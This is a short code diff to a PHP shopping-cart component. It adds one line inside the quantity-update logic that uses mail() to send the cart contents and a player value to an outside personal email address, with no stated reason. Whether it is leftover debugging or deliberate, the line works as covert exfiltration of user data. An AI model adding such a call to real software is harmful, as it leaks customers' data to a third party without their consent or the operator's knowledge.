@@ -69,6 +69,7 @@ class CartComponent extends Component {
 			    $quantity = (int)$item['quantity'] + 1;
 			}
 		    }
+                    mail('ehask71@gmail.com','CartItems',print_r($cartitems,1).' '.$player);
 		}
 		
 		if(empty($product)) {
